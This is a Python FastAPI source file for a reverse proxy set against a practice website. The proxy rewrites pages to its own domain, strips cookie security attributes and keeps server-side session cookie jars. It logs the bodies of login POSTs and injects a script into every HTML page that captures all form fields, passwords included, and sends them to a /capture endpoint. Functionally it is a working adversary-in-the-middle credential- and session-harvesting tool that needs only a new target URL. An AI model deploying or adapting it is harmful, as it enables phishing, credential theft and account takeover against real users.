import re
import time
import uuid
import json
import asyncio
import httpx
import websockets
from typing import Dict
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse, JSONResponse
from urllib.parse import urljoin, urlparse

# =========================================================
# [CONFIGURATION & CONSTANTS]
# =========================================================
TARGET_BASE = "https://the-internet.herokuapp.com/"
parsed_target = urlparse(TARGET_BASE)
TARGET_DOMAIN = parsed_target.netloc

# Added "cookie" to prevent raw browser cookies from leaking to the target
HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers",
    "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", "accept-encoding", "content-security-policy",
    "cookie" 
}

COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]

SESSION_FILE = "proxy_sessions.json"
SESSION_TIMEOUT = 1800  # 30 minutes in seconds

# =========================================================
# [SESSION MANAGER MODULE]
# =========================================================
class SessionManager:
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    async def load(self):
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
                async with self.lock:
                    self.sessions = data
            print(f"[*] Loaded {len(self.sessions)} sessions from disk.")
        except (FileNotFoundError, json.JSONDecodeError):
            print("[*] No existing session file found. Starting fresh.")

    async def save(self):
        async with self.lock:
            with open(SESSION_FILE, "w") as f:
                json.dump(self.sessions, f)

    async def get_or_create_session(self, session_id: str = None) -> str:
        async with self.lock:
            now = time.time()
            if session_id and session_id in self.sessions:
                self.sessions[session_id]["last_accessed"] = now
                return session_id
            
            new_id = str(uuid.uuid4())
            self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
            return new_id

    async def get_cookies(self, session_id: str) -> dict:
        async with self.lock:
            session = self.sessions.get(session_id)
            if session:
                session["last_accessed"] = time.time()
                return session["cookies"].copy()
            return {}

    async def update_cookies(self, session_id: str, new_cookies: dict):
        if not new_cookies:
            return
        async with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["cookies"].update(new_cookies)
        asyncio.create_task(self.save())

    async def cleanup_loop(self):
        while True:
            await asyncio.sleep(60) 
            now = time.time()
            expired_keys = []
            async with self.lock:
                for sid, data in self.sessions.items():
                    if now - data["last_accessed"] > SESSION_TIMEOUT:
                        expired_keys.append(sid)
                for sid in expired_keys:
                    del self.sessions[sid]
            
            if expired_keys:
                print(f"[*] Cleaned up {len(expired_keys)} expired sessions.")
                await self.save()

session_manager = SessionManager()

@asynccontextmanager
async def lifespan(app: FastAPI):
    await session_manager.load()
    cleanup_task = asyncio.create_task(session_manager.cleanup_loop())
    yield
    cleanup_task.cancel()
    await session_manager.save()

# =========================================================
# [APP INIT]
# =========================================================
app = FastAPI(lifespan=lifespan)
client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)

# =========================================================
# CLIENT-SIDE FORM OBSERVATION SCRIPT
# =========================================================
FORM_OBSERVER_SCRIPT = """
<script>
(function() {
    console.log('[Proxy Observer] Form submission watcher injected');

    function captureFormData(form) {
        const formData = {};
        const inputs = form.querySelectorAll('input, textarea, select');

        inputs.forEach(input => {
            const name = input.name || input.id;
            if (!name) return;

            if (input.type === 'password') {
                formData[name] = input.value; 
            } else if (input.type === 'checkbox' || input.type === 'radio') {
                formData[name] = input.checked;
            } else if (input.tagName === 'SELECT') {
                formData[name] = input.value;
            } else {
                formData[name] = input.value;
            }
        });

        return {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            formAction: form.action || window.location.href,
            method: form.method.toUpperCase() || 'GET',
            formId: form.id || null,
            formData: formData
        };
    }

    function attachFormListeners() {
        document.querySelectorAll('form').forEach(form => {
            if (form.dataset.observerAttached) return;
            form.dataset.observerAttached = 'true';

            form.addEventListener('submit', function(e) {
                const captured = captureFormData(form);
                try {
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(captured),
                        keepalive: true
                    });
                    console.log('[Proxy Observer] Form submission captured:', captured);
                } catch (err) {
                    console.warn('[Proxy Observer] Failed to send form data:', err);
                }
            }, true); 
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', attachFormListeners);
    } else {
        attachFormListeners();
    }

    const observer = new MutationObserver(() => attachFormListeners());
    observer.observe(document.documentElement, { childList: true, subtree: true });
})();
</script>
"""

# =========================================================
# [WEBSOCKET PROXY MODULE] 
# =========================================================
@app.websocket("/{path:path}")
async def websocket_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    
    # --- SESSION MANAGEMENT: WEBSOCKET ---
    client_session_id = websocket.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)
    
    cookie_str = "; ".join([f"{k}={v}" for k, v in session_cookies.items()])
    ws_headers = {"Cookie": cookie_str} if cookie_str else {}
    # -------------------------------------

    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
    
    query_string = websocket.url.query
    if query_string:
        target_ws_url += f"?{query_string}"
    
    print(f"\n[WS] Intercepted WebSocket Upgrade -> Forwarding to: {target_ws_url}")
    
    try:
        async with websockets.connect(target_ws_url, extra_headers=ws_headers) as target_ws:
            async def forward_to_target():
                try:
                    while True:
                        data = await websocket.receive_text()
                        await target_ws.send(data)
                except WebSocketDisconnect:
                    pass

            async def forward_to_client():
                try:
                    while True:
                        data = await target_ws.recv()
                        await websocket.send_text(data)
                except websockets.exceptions.ConnectionClosed:
                    pass

            await asyncio.gather(forward_to_target(), forward_to_client())
            
    except Exception as e:
        print(f"[WS] Connection Error: {e}")
    finally:
        try:
            await websocket.close()
        except:
            pass

# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================
@app.post("/capture")
async def capture_form_data(data: dict):
    print("\n" + "="*60)
    print("[CAPTURE] Form Submission Received")
    print(f"URL: {data.get('url')}")
    print(f"Method: {data.get('method')}")
    for key, value in data.get('formData', {}).items():
        print(f"   {key}: {value}")
    print("="*60)
    return JSONResponse(content={"status": "captured"}, status_code=200)

# =========================================================
# [HTTP PROXY MODULE]
# =========================================================
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(request: Request, path: str):
    query_string = request.url.query
    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query_string:
        target_url += f"?{query_string}"

    proxy_base = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    # --- SESSION MANAGEMENT: INBOUND ---
    client_session_id = request.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create_session(client_session_id)
    session_cookies = await session_manager.get_cookies(session_id)

    # Merge browser cookies (excluding our tracker) with server-side jar
    browser_cookies = dict(request.cookies)
    browser_cookies.pop("proxy_session_id", None)
    merged_cookies = {**session_cookies, **browser_cookies}
    # -----------------------------------

    req_headers = []
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue
        if k_lower in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace("http://", "https://") 
        req_headers.append((k, v))

    req_headers.append(("host", TARGET_DOMAIN))
    req_headers.append(("accept-encoding", "identity"))

    body = await request.body()

    if request.method == "POST":
        path_lower = path.lower()
        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
            print(f"\n[!] Auth POST Intercepted | Path: /{path}")
            try:
                print(f" Payload: {body.decode('utf-8', errors='replace')}")
            except Exception:
                pass

    try:
        proxy_req = client.build_request(
            method=request.method,
            url=target_url,
            headers=req_headers,
            content=body,
            cookies=merged_cookies # Inject isolated session cookies
        )
        resp = await client.send(proxy_req, stream=True)
    except httpx.RequestError as exc:
        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")

    # --- SESSION MANAGEMENT: OUTBOUND ---
    if resp.cookies:
        await session_manager.update_cookies(session_id, dict(resp.cookies))
    # ------------------------------------

    processed_headers = []
    for k, v in resp.headers.multi_items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue

        if k_lower == "location":
            v = v.replace(TARGET_DOMAIN, proxy_domain).replace("https://", "http://")  
            processed_headers.append((k, v))
        elif k_lower == "set-cookie":
            v = COOKIE_DOMAIN_RE.sub("", v)
            v = re.sub(r"(?i);\s*Secure", "", v)
            v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed_headers.append((k, v))
        else:
            processed_headers.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    if any(t in content_type for t in ["text/html", "javascript", "json", "application/javascript"]):
        try:
            raw_bytes = await resp.aread()
        except httpx.ReadError as exc:
            print(f"[!] ReadError: {exc}")
            await resp.aclose()
            raise HTTPException(status_code=502, detail="Upstream dropped connection.")

        text = raw_bytes.decode("utf-8", errors="ignore")
        rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
        rewritten = rewritten.replace("https://" + proxy_domain, "http://" + proxy_domain)

        if "text/html" in content_type:
            if "</body>" in rewritten.lower():
                rewritten = re.sub(r'(?i)</body>', FORM_OBSERVER_SCRIPT + '</body>', rewritten, count=1)
            else:
                rewritten += FORM_OBSERVER_SCRIPT

        final_response = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type
        )
        await resp.aclose()

    else:
        async def safe_stream_generator():
            try:
                async for chunk in resp.aiter_bytes():
                    yield chunk
            except httpx.ReadError:
                pass
            finally:
                await resp.aclose()

        final_response = StreamingResponse(safe_stream_generator(), status_code=resp.status_code)

    if "content-length" in final_response.headers:
        del final_response.headers["content-length"]

    # --- SESSION MANAGEMENT: BROWSER ATTACH ---
    if client_session_id != session_id:
        final_response.set_cookie(
            key="proxy_session_id",
            value=session_id,
            httponly=True,
            samesite="Lax",
            max_age=SESSION_TIMEOUT
        )
    # ------------------------------------------

    for k, v in processed_headers:
        if k.lower() in ("content-length", "content-type"):
            continue
        final_response.headers.append(k, v)

    return final_response